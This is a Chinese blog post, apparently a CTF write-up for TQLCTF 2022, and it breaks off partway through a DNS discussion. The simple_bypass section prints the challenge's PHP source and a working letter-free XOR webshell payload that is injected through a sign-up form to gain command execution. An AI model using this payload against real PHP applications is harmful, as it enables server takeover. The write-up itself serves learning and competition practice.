<!DOCTYPE html><html lang="ch" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>TQLCTF2022 | Hexo</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":true,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - 共 $1 行","copy":"复制","copyFinish":"复制成功","expand":"展开"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>TQLCTF2022</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-05-16T02:52:23.000Z" id="date"> 2023-05-16</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-05-18T03:49:01.908Z" id="updated"> 2023-05-18</time></div></span></div></div><hr><div id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个比赛应该很有难度，估计得是完完全全看着wp写，里面的nodejs和DNS污染我是都没有接触过的，试试吧，一起学习一下</p>
<h1 id="TQLCTF-2022-simple-bypass"><a href="#TQLCTF-2022-simple-bypass" class="headerlink" title="[TQLCTF 2022]simple_bypass"></a>[TQLCTF 2022]simple_bypass</h1><p>这题难度就可见一斑，连入口都没有找到。</p>
<p>用view-source看源码</p>
<p class='item-img' data-src='/2023/05/16/TQLCTF2022/image-20230516110535510.png'><img src="/2023/05/16/TQLCTF2022/image-20230516110535510.png" alt="image-20230516110535510"></p>
<p>这里要敏锐的发现一个文件包含漏洞。</p>
<p>利用这个读取敏感文件，比如index.php</p>
<p class='item-img' data-src='/2023/05/16/TQLCTF2022/image-20230516110637230.png'><img src="/2023/05/16/TQLCTF2022/image-20230516110637230.png" alt="image-20230516110637230"></p>
<p>出来了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php<br>error_reporting(0);<br>if(isset($_POST[&#x27;user&#x27;]) &amp;&amp; isset($_POST[&#x27;pass&#x27;]))&#123;<br>	$hash_user = md5($_POST[&#x27;user&#x27;]);<br>	$hash_pass = &#x27;zsf&#x27;.md5($_POST[&#x27;pass&#x27;]);<br>	if(isset($_POST[&#x27;punctuation&#x27;]))&#123;<br>		//filter<br>		if (strlen($_POST[&#x27;user&#x27;]) &gt; 6)&#123;<br>			echo(&quot;&lt;script&gt;alert(&#x27;Username is too long!&#x27;);&lt;/script&gt;&quot;);<br>		&#125;<br>		elseif(strlen($_POST[&#x27;website&#x27;]) &gt; 25)&#123;<br>			echo(&quot;&lt;script&gt;alert(&#x27;Website is too long!&#x27;);&lt;/script&gt;&quot;);<br>		&#125;<br>		elseif(strlen($_POST[&#x27;punctuation&#x27;]) &gt; 1000)&#123;<br>			echo(&quot;&lt;script&gt;alert(&#x27;Punctuation is too long!&#x27;);&lt;/script&gt;&quot;);<br>		&#125;<br>		else&#123;<br>			if(preg_match(&#x27;/[^\w\/\(\)\*&lt;&gt;]/&#x27;, $_POST[&#x27;user&#x27;]) === 0)&#123;<br>				if (preg_match(&#x27;/[^\w\/\*:\.\;\(\)\n&lt;&gt;]/&#x27;, $_POST[&#x27;website&#x27;]) === 0)&#123;<br>					$_POST[&#x27;punctuation&#x27;] = preg_replace(&quot;/[a-z,A-Z,0-9&gt;\?]/&quot;,&quot;&quot;,$_POST[&#x27;punctuation&#x27;]);<br>					$template = file_get_contents(&#x27;./template.html&#x27;);<br>					$content = str_replace(&quot;__USER__&quot;, $_POST[&#x27;user&#x27;], $template);<br>					$content = str_replace(&quot;__PASS__&quot;, $hash_pass, $content);<br>					$content = str_replace(&quot;__WEBSITE__&quot;, $_POST[&#x27;website&#x27;], $content);<br>					$content = str_replace(&quot;__PUNC__&quot;, $_POST[&#x27;punctuation&#x27;], $content);<br>					file_put_contents(&#x27;sandbox/&#x27;.$hash_user.&#x27;.php&#x27;, $content);<br>					echo(&quot;&lt;script&gt;alert(&#x27;Successed!&#x27;);&lt;/script&gt;&quot;);<br>				&#125;<br>				else&#123;<br>					echo(&quot;&lt;script&gt;alert(&#x27;Invalid chars in website!&#x27;);&lt;/script&gt;&quot;);<br>				&#125;<br>			&#125;<br>			else&#123;<br>				echo(&quot;&lt;script&gt;alert(&#x27;Invalid chars in username!&#x27;);&lt;/script&gt;&quot;);<br>			&#125;<br>		&#125;<br>	&#125;<br>	else&#123;<br>		setcookie(&quot;user&quot;, $_POST[&#x27;user&#x27;], time()+3600);<br>		setcookie(&quot;pass&quot;, $hash_pass, time()+3600);<br>		Header(&quot;Location:sandbox/$hash_user.php&quot;);<br>	&#125;<br>&#125;<br>?&gt;<br><br>&lt;!doctype html&gt;<br>&lt;html lang=&quot;zh&quot;&gt;<br>&lt;head&gt;<br>	&lt;meta charset=&quot;UTF-8&quot;&gt;<br>	&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt; <br>	&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;<br>	&lt;title&gt;Simple Linux&lt;/title&gt;<br>	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/styles.css&quot;&gt;<br>	&lt;!--[if IE]&gt;<br>		&lt;script src=&quot;http://libs.baidu.com/html5shiv/3.7/html5shiv.min.js&quot;&gt;&lt;/script&gt;<br>	&lt;![endif]--&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>	&lt;div class=&quot;jq22-container&quot; style=&quot;padding-top:100px&quot;&gt;<br>		&lt;div class=&quot;login-wrap&quot;&gt;<br>			&lt;div class=&quot;login-html&quot;&gt;<br>				&lt;input id=&quot;tab-1&quot; type=&quot;radio&quot; name=&quot;tab&quot; class=&quot;sign-in&quot; checked&gt;&lt;label for=&quot;tab-1&quot; class=&quot;tab&quot;&gt;Sign In&lt;/label&gt;<br>				&lt;input id=&quot;tab-2&quot; type=&quot;radio&quot; name=&quot;tab&quot; class=&quot;sign-up&quot;&gt;&lt;label for=&quot;tab-2&quot; class=&quot;tab&quot;&gt;Sign Up&lt;/label&gt;<br>				&lt;div class=&quot;login-form&quot;&gt;<br>					&lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;<br>						&lt;div class=&quot;sign-in-htm&quot;&gt;<br>							&lt;div class=&quot;group&quot;&gt;<br>								&lt;label for=&quot;user&quot; class=&quot;label&quot;&gt;Username&lt;/label&gt;<br>								&lt;input id=&quot;user&quot; name=&quot;user&quot; type=&quot;text&quot; class=&quot;input&quot;&gt;<br>							&lt;/div&gt;<br>							&lt;div class=&quot;group&quot;&gt;<br>								&lt;label for=&quot;pass&quot; class=&quot;label&quot;&gt;Password&lt;/label&gt;<br>								&lt;input id=&quot;pass&quot; name=&quot;pass&quot; type=&quot;password&quot; class=&quot;input&quot; data-type=&quot;password&quot;&gt;<br>							&lt;/div&gt;<br>							&lt;!-- &lt;div class=&quot;group&quot;&gt;<br>								&lt;input id=&quot;check&quot; type=&quot;checkbox&quot; class=&quot;check&quot; checked&gt;<br>								&lt;label for=&quot;check&quot;&gt;&lt;span class=&quot;icon&quot;&gt;&lt;/span&gt; Keep me Signed in&lt;/label&gt;<br>							&lt;/div&gt; --&gt;<br>							&lt;div class=&quot;group&quot;&gt;<br>								&lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Sign In&quot;&gt;<br>							&lt;/div&gt;<br>							&lt;div class=&quot;hr&quot;&gt;&lt;/div&gt;<br>							&lt;!-- &lt;div class=&quot;foot-lnk&quot;&gt;<br>								&lt;a href=&quot;#forgot&quot;&gt;Forgot Password?&lt;/a&gt;<br>							&lt;/div&gt; --&gt;<br>						&lt;/div&gt;<br>					&lt;/form&gt;<br>					&lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;<br>						&lt;div class=&quot;sign-up-htm&quot;&gt;<br>							&lt;div class=&quot;group&quot;&gt;<br>								&lt;label for=&quot;user&quot; class=&quot;label&quot;&gt;Username&lt;/label&gt;<br>								&lt;input id=&quot;user&quot; name=&quot;user&quot; type=&quot;text&quot; class=&quot;input&quot;&gt;<br>							&lt;/div&gt;<br>							&lt;div class=&quot;group&quot;&gt;<br>								&lt;label for=&quot;pass&quot; class=&quot;label&quot;&gt;Password&lt;/label&gt;<br>								&lt;input id=&quot;pass&quot; name=&quot;pass&quot; type=&quot;password&quot; class=&quot;input&quot; data-type=&quot;password&quot;&gt;<br>							&lt;/div&gt;<br>							&lt;div class=&quot;group&quot;&gt;<br>								&lt;label for=&quot;pass&quot; class=&quot;label&quot;&gt;Your Website&lt;/label&gt;<br>								&lt;input id=&quot;pass&quot; name=&quot;website&quot; type=&quot;text&quot; class=&quot;input&quot;&gt;<br>							&lt;/div&gt;<br>							&lt;div class=&quot;group&quot;&gt;<br>								&lt;label for=&quot;pass&quot; class=&quot;label&quot;&gt;Your Punctuation&lt;/label&gt;<br>								&lt;input id=&quot;pass&quot; name=&quot;punctuation&quot; type=&quot;text&quot; class=&quot;input&quot;&gt;<br>							&lt;/div&gt;<br>							&lt;div class=&quot;group&quot;&gt;<br>								&lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Sign Up&quot;&gt;<br>							&lt;/div&gt;<br>							&lt;div class=&quot;hr&quot;&gt;&lt;/div&gt;<br>							&lt;div class=&quot;foot-lnk&quot;&gt;<br>								&lt;label for=&quot;tab-1&quot;&gt;Already Member?&lt;/a&gt;<br>							&lt;/div&gt;<br>						&lt;/div&gt;<br>					&lt;/form&gt;<br>				&lt;/div&gt;<br>			&lt;/div&gt;<br>		&lt;/div&gt;<br>	&lt;/div&gt;<br>	<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br><br></code></pre></td></tr></table></figure>

<p>得到这样一段源码</p>
<p>代码审计一下</p>
<p>这里是登录界面的源代码</p>
<p>没发现有什么特点。里面有一个template.html</p>
<p>看看这么长的代码完全不想看，还是得看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>			<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>			<span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">string</span>)__USER__);<br>			<span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">string</span>)__PASS__);<br>			<br>			<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>] === <span class="hljs-variable">$user</span> &amp;&amp; <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;pass&#x27;</span>] === <span class="hljs-variable">$pass</span>)&#123;<br>				<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>			&#125;<br>			<span class="hljs-keyword">else</span>&#123;<br>				<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Permission denied!&#x27;);&lt;/script&gt;&quot;</span>);<br>			&#125;<br>		<span class="hljs-meta">?&gt;</span><br>		&lt;/li&gt;<br>      &lt;/ul&gt;<br>      &lt;ul <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">item</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">li</span>&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">sitting_btn</span>&quot;&gt;&lt;/<span class="hljs-title">span</span>&gt;系统设置&lt;/<span class="hljs-title">li</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">li</span>&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">help_btn</span>&quot;&gt;&lt;/<span class="hljs-title">span</span>&gt;使用指南 &lt;<span class="hljs-title">b</span>&gt;&lt;/<span class="hljs-title">b</span>&gt;&lt;/<span class="hljs-title">li</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">li</span>&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">about_btn</span>&quot;&gt;&lt;/<span class="hljs-title">span</span>&gt;关于我们&lt;/<span class="hljs-title">li</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">li</span>&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">logout_btn</span>&quot;&gt;&lt;/<span class="hljs-title">span</span>&gt;退出系统&lt;/<span class="hljs-title">li</span>&gt;</span><br><span class="hljs-class">      &lt;/<span class="hljs-title">ul</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">  &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;#&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">powered_by</span>&quot;&gt;<span class="hljs-title">__PUNC__</span>&lt;/<span class="hljs-title">a</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">ul</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">deskIcon</span>&quot;&gt;</span><br><span class="hljs-class">  &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">desktop_icon</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">win5</span>&quot; <span class="hljs-title">path</span>=&quot;<span class="hljs-title">https</span>://<span class="hljs-title">image</span>.<span class="hljs-title">baidu</span>.<span class="hljs-title">com</span>/&quot;&gt; &lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">icon</span>&quot;&gt;&lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=&quot;../<span class="hljs-title">img</span>/<span class="hljs-title">icon4</span>.<span class="hljs-title">png</span>&quot;/&gt;&lt;/<span class="hljs-title">span</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">text</span>&quot;&gt;图片</span><br><span class="hljs-class">      &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">right_cron</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">  &lt;/<span class="hljs-title">li</span>&gt;</span><br><span class="hljs-class">  &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">desktop_icon</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">win6</span>&quot; <span class="hljs-title">path</span>=&quot;<span class="hljs-title">http</span>://<span class="hljs-title">www</span>.4399.<span class="hljs-title">com</span>/&quot;&gt; &lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">icon</span>&quot;&gt;&lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=&quot;../<span class="hljs-title">img</span>/<span class="hljs-title">icon5</span>.<span class="hljs-title">png</span>&quot;/&gt;&lt;/<span class="hljs-title">span</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">text</span>&quot;&gt;游戏</span><br><span class="hljs-class">      &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">right_cron</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">  &lt;/<span class="hljs-title">li</span>&gt;</span><br><span class="hljs-class">  &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">desktop_icon</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">win10</span>&quot; <span class="hljs-title">path</span>=&quot;../<span class="hljs-title">get_pic</span>.<span class="hljs-title">php</span>?<span class="hljs-title">image</span>=<span class="hljs-title">img</span>/<span class="hljs-title">haokangde</span>.<span class="hljs-title">png</span>&quot;&gt; &lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">icon</span>&quot;&gt;&lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=&quot;../<span class="hljs-title">img</span>/<span class="hljs-title">icon4</span>.<span class="hljs-title">png</span>&quot;/&gt;&lt;/<span class="hljs-title">span</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">text</span>&quot;&gt;&lt;<span class="hljs-title">b</span>&gt;好康的&lt;/<span class="hljs-title">b</span>&gt;</span><br><span class="hljs-class">      &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">right_cron</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">  &lt;/<span class="hljs-title">li</span>&gt;</span><br><span class="hljs-class">  &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">desktop_icon</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">win16</span>&quot; <span class="hljs-title">path</span>=&quot;<span class="hljs-title">__WEBSITE__</span>&quot;&gt; &lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">icon</span>&quot;&gt;&lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=&quot;../<span class="hljs-title">img</span>/<span class="hljs-title">icon10</span>.<span class="hljs-title">png</span>&quot;/&gt;&lt;/<span class="hljs-title">span</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">text</span>&quot;&gt;&lt;<span class="hljs-title">b</span>&gt;你的网站&lt;/<span class="hljs-title">b</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>看看关键代码</p>
<p>总结一下，漏洞点永远存在于输入</p>
<p>user，website，punctuation这几个，有长度去构造输入的就是punctuation</p>
<p class='item-img' data-src='/2023/05/16/TQLCTF2022/image-20230516113007105.png'><img src="/2023/05/16/TQLCTF2022/image-20230516113007105.png" alt="image-20230516113007105"></p>
<p class='item-img' data-src='/2023/05/16/TQLCTF2022/image-20230516113018788.png'><img src="/2023/05/16/TQLCTF2022/image-20230516113018788.png" alt="image-20230516113018788"></p>
<p>包括过滤方面，也只有_PUNC_过滤的是最少的，只ban掉了字母和数字</p>
<p>具体怎么输入，只要知道</p>
<p class='item-img' data-src='/2023/05/16/TQLCTF2022/image-20230516113252275.png'><img src="/2023/05/16/TQLCTF2022/image-20230516113252275.png" alt="image-20230516113252275"></p>
<p>这里是用了替换的</p>
<p>等于我们输入的就是会到这个template.html源码里面，emmmm有点乱，就是直接在注册框里面输入，我们就会给其赋值</p>
<p>利用无字母rce</p>
<p>这个是很简单的</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php<br>$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);<br>$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);<br>$___=$$__;<br>$_($___[_]);<br></code></pre></td></tr></table></figure>

<p>这时候并不可以直接利用，因为代码执行不在php里面</p>
<p>所以我们需要去注释</p>
<p>最终的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">user=1)/*&amp;pass=aa&amp;website=&amp;punctuation=*/;$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[_]);/*<br></code></pre></td></tr></table></figure>

<p>用这个去注册，然后post传_&#x3D;system(命令);</p>
<p>就可以了</p>
<p class='item-img' data-src='/2023/05/16/TQLCTF2022/image-20230516120613709.png'><img src="/2023/05/16/TQLCTF2022/image-20230516120613709.png" alt="image-20230516120613709"></p>
<p>写的很乱，但是都讲到了</p>
<h1 id="TQLCTF-2022-SQL-TEST"><a href="#TQLCTF-2022-SQL-TEST" class="headerlink" title="[TQLCTF 2022]SQL TEST"></a>[TQLCTF 2022]SQL TEST</h1><p>真的很烦，很多环境都是坏的</p>
<h1 id="TQLCTF-2022-network-tools"><a href="#TQLCTF-2022-network-tools" class="headerlink" title="[TQLCTF 2022]network tools"></a>[TQLCTF 2022]network tools</h1><p class='item-img' data-src='/2023/05/16/TQLCTF2022/image-20230518110510850.png'><img src="/2023/05/16/TQLCTF2022/image-20230518110510850.png" alt="image-20230518110510850"></p>
<p>这题给了几个工具，都用了一下，没有什么头绪</p>
<p class='item-img' data-src='/2023/05/16/TQLCTF2022/image-20230518110548425.png'><img src="/2023/05/16/TQLCTF2022/image-20230518110548425.png" alt="image-20230518110548425"></p>
<p>查了一下，要先学几个前置知识，一个就是DNS</p>
<p class='item-img' data-src='/2023/05/16/TQLCTF2022/image-20230518110631547.png'><img src="/2023/05/16/TQLCTF2022/image-20230518110631547.png" alt="image-20230518110631547"></p>
<p>我画了个图，这里就是DNS工作的主要流程，其实就是层层递归</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 